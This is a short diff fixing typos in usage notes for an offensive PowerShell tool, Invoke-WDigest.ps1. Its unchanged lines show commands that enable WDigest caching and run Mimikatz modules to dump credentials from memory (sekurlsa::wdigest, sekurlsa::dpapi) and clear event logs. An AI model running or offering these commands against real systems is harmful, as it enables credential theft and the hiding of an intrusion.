@@ -44,7 +44,7 @@ Get-Help .\Invoke-WDigest.ps1 -full
 # Execute Mimikatz (multiple dump::modules) without WDigest caching
 .\Invoke-WDigest.ps1 -wdigest 'false' -manycats -module 'net::group sekurlsa::wdigest sekurlsa::dpapi event::clear exit'
 
-#  Ativate WDigest caching + Exec M[i]mika[t]z pre-sellection of dump::modules
+#  Ativate WDigest caching + Exec Mimikatz pre-sellection of dump::modules
 .\Invoke-WDigest.ps1 -wdigest 'true' -manycats -module 'auto'
 
 
@@ -65,7 +65,7 @@ REMARK
    in a minimized windows (detach from parent). Child process its necessary
    for mimikatz 'sekurlsa::wdigest' to dump the credential from Memory.
    
-   [Downside] -runas pauses cmdlet execution while the credential its not input.
+   [Downside] -runas switch pauses cmdlet execution waiting for credential input.
 ```
 
 <br />
